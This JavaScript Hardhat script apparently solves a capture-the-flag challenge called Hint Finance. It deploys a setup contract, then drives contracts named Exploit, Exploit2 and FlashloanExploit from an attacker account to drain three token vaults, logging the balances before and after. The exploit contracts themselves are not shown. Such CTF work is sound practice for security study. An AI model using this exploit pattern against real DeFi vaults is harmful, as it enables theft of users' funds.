const { ethers } = require("hardhat");

async function main() {
  // Get Signers
  const [deployer, attacker] = await ethers.getSigners();

  // Deploy Setup Contract
  console.log(
    "Deployer Balance before deploy: " +
      ethers.utils.formatEther(
        await ethers.provider.getBalance(deployer.address)
      )
  );
  const Setup = await ethers.getContractFactory("Setup");
  const setup = await Setup.deploy({ value: ethers.utils.parseEther("30") });
  console.log("Setup Contract Deployer at: " + setup.address);
  console.log(
    "Deployer Balance after deploy: " +
      ethers.utils.formatEther(
        await ethers.provider.getBalance(deployer.address)
      )
  );

  // Get deployed hintFinanceFactory contract
  const hintFinanceFactoryAddress = await setup.hintFinanceFactory();
  const hintFinanceFactory = await ethers.getContractAt(
    "HintFinanceFactory",
    hintFinanceFactoryAddress
  );

  // Get three vaults address
  const vault1Address = await hintFinanceFactory.underlyingToVault(
    "0x89Ab32156e46F46D02ade3FEcbe5Fc4243B9AAeD"
  );
  console.log("Vault1 Address: " + vault1Address);
  const vault2Address = await hintFinanceFactory.underlyingToVault(
    "0x3845badAde8e6dFF049820680d1F14bD3903a5d0"
  );
  console.log("Vault2 Address: " + vault2Address);
  const vault3Address = await hintFinanceFactory.underlyingToVault(
    "0xfF20817765cB7f73d4bde2e66e067E58D11095C2"
  );
  console.log("Vault3 Address: " + vault3Address);

  // Get three vaults balances
  const token1 = await ethers.getContractAt(
    "IERC20",
    "0x89Ab32156e46F46D02ade3FEcbe5Fc4243B9AAeD"
  );
  const vault1Balance = await token1.balanceOf(vault1Address);
  console.log("Vault1 Balance: " + ethers.utils.formatEther(vault1Balance));

  const token2 = await ethers.getContractAt(
    "IERC20",
    "0x3845badAde8e6dFF049820680d1F14bD3903a5d0"
  );
  const vault2Balance = await token2.balanceOf(vault2Address);
  console.log("Vault2 Balance: " + ethers.utils.formatEther(vault2Balance));

  const token3 = await ethers.getContractAt(
    "IERC20",
    "0xfF20817765cB7f73d4bde2e66e067E58D11095C2"
  );
  const vault3Balance = await token3.balanceOf(vault3Address);
  console.log("Vault3 Balance: " + ethers.utils.formatEther(vault3Balance));

  // Get three vaults totalSupply
  const vault1 = await ethers.getContractAt("HintFinanceVault", vault1Address);
  const vault1Supply = await vault1.totalSupply();
  console.log("Vault1 TotalSupply: " + vault1Supply);

  const vault2 = await ethers.getContractAt("HintFinanceVault", vault2Address);
  const vault2Supply = await vault2.totalSupply();
  console.log("Vault2 TotalSupply: " + vault2Supply);

  const vault3 = await ethers.getContractAt("HintFinanceVault", vault3Address);
  const vault3Supply = await vault3.totalSupply();
  console.log("Vault3 TotalSupply: " + vault3Supply);

  // Exploit First Token
  const Exploit = await ethers.getContractFactory("Exploit");
  const exploitContract = await Exploit.deploy(vault1Address, vault3Address);

  await exploitContract
    .connect(attacker)
    .getUnderlying({ value: ethers.utils.parseEther("10") });
  // console.log(await token1.balanceOf(exploitContract.address));
  await exploitContract.registerInterface();
  await exploitContract.totalExploit();
  await exploitContract.registerInterface2();
  // console.log(await token1.balanceOf(vault1Address));
  // console.log(await token1.balanceOf(exploitContract.address));

  // Exploit Second Token
  const Exploit2 = await ethers.getContractFactory("Exploit2");
  const exploitContract2 = await Exploit2.deploy(vault3Address);

  await exploitContract2
    .connect(attacker)
    .getUnderlying({ value: ethers.utils.parseEther("10") });
  console.log(await token3.balanceOf(exploitContract2.address));
  await exploitContract2.registerInterface();
  await exploitContract2.totalExploit();
  console.log(await token3.balanceOf(vault3Address));
  console.log(await token3.balanceOf(exploitContract2.address));

  const FlashloanExploit = await ethers.getContractFactory("FlashloanExploit");
  const flahsloanExploit = await FlashloanExploit.deploy();
  await flahsloanExploit.connect(attacker).exploit(vault2Address);
  console.log(await token2.balanceOf(vault2Address));
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
